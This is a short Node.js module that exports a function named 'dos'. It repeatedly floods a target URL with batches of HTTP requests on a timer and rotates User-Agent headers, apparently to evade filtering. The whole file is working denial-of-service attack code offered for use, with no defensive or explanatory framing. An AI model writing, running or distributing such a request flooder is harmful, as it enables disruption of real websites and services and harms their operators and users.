const request = require('request');

const dos = (url, qty, ms, userAgents) => {
    const getRandomUserAgent = () => {
        const randomIndex = Math.floor(Math.random() * userAgents.length);
        return userAgents[randomIndex];
    };

    const sendRequests = () => {
        const userAgent = getRandomUserAgent();
        const requestOptions = { url, headers: { 'User-Agent': userAgent } };

        for (let i = 0; i < qty; i++) {
            request(requestOptions, (error, response) => {
                if (error) {
                    console.error(`Error: ${error.message}`);
                } else {
                    console.log(`Response: ${response.statusCode}`);
                }
            });
        }
    };

    setInterval(sendRequests, ms);
};

module.exports = dos;
